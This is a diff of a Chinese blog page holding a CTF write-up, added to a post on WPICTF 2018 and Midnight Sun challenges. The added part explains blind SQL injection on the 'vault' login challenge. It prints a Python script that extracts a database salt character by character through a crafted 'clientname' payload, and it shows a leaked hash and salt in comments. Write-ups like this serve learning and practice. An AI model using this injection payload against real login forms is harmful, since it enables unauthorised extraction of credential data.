@@ -108,7 +108,7 @@
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/wpictfsql3.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/wpictfsql6.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/wpictfsql5.PNG">
-<meta property="og:updated_time" content="2018-04-17T15:19:59.159Z">
+<meta property="og:updated_time" content="2018-04-17T15:50:18.545Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="少许ctfwp">
 <meta name="twitter:description" content="这周的cfttime上的一些比赛">
@@ -377,6 +377,17 @@
 <p>但是dalao给出了限制方法 就是 直接输 id 在后面加上 FROM clients WHERE clientname = ‘Goutham’</p>
 <p><img src="http://otvzfr1o1.bkt.clouddn.com/wpictfsql5.PNG" alt=""></p>
 <p>至于这里为啥是Goutham因为首页上他的话里提到了密码。。</p>
+<p>一个有趣的地方 </p>
+<p>之前说了我是当盲注写脚本跑的 由于很多函数都没有 mid ascii ord等等都没(我还试了试lctf上那几种跑错的函数也没有) 最后用了 &gt; 跑出来的</p>
+<p>跑的时候发现从第二位开始是要把上一位先减一的 所以我以为在跑完后要把所有的加1</p>
+<p>但是因为有字符9的存在 9+1的ascii码就是:了 显然加密中密文是不会出现这个东西的 </p>
+<p>所以我后来一度以为我的脚本有问题</p>
+<p>然后看到了某个师傅用sqlmap跑出来的hash和salt发现只用把最后一位加1就行了(这点现在还是有点懵逼。。为啥最后一位要加1)</p>
+<p><a href="https://rawsec.ml/en/WPICTF-2018-write-ups/#200-vault-web" target="_blank" rel="external">https://rawsec.ml/en/WPICTF-2018-write-ups/#200-vault-web</a></p>
+<p>然而拿到那三人的hash和salt也没用 这题出题人后来说不需要暴力 而是要欺骗数据库后 还是得用上面的方法解</p>
+<p>不过可以使用一些软件比如hashid就可以识别出它的加密方式是sha256 就不用一个个去试可能的加密方式了</p>
+<p>我当时写的脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line">url = <span class="string">"https://vault.wpictf.xyz/login"</span></div><div class="line"><span class="comment">#hash = "ae6b2b347fd948b39a126e71decfc1cc411925a1ddc9f995949517d983fb027a"</span></div><div class="line"></div><div class="line"><span class="comment">#salt = "leoczvd"</span></div><div class="line"></div><div class="line">flag=<span class="string">"leoc"</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,500):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(47,127):</div><div class="line">        payload =<span class="string">"Gaines ' or ((select salt from clients ) &gt; '%s') --+"</span>%(flag+chr(j))</div><div class="line">        data = &#123;</div><div class="line">             <span class="string">"password"</span>:<span class="string">"1"</span>,</div><div class="line">             <span class="string">"clientname"</span>:payload</div><div class="line">        &#125;</div><div class="line">        s = requests.post(url=url,data=data)</div><div class="line">        <span class="keyword">if</span> <span class="string">"No"</span> <span class="keyword">in</span> s.content:</div><div class="line">            flag += chr(j-1)</div><div class="line">            <span class="built_in">print</span> flag <span class="comment">#跑出来的flag最后一位ascii要加1</span></div><div class="line">            <span class="built_in">break</span></div></pre></td></tr></table></figure>
 <h2 id="Midnight-Sun-CTF-Quals"><a href="#Midnight-Sun-CTF-Quals" class="headerlink" title="Midnight Sun CTF Quals"></a>Midnight Sun CTF Quals</h2><h3 id="web200-1"><a href="#web200-1" class="headerlink" title="web200"></a>web200</h3><p>insert sql注入</p>
 <p>这个思路挺奇特的 利用sql重置了root的密码 话说我insert的注入还不是很熟。。。</p>
 <p><a href="https://ctftime.org/writeup/9712" target="_blank" rel="external">https://ctftime.org/writeup/9712</a></p>
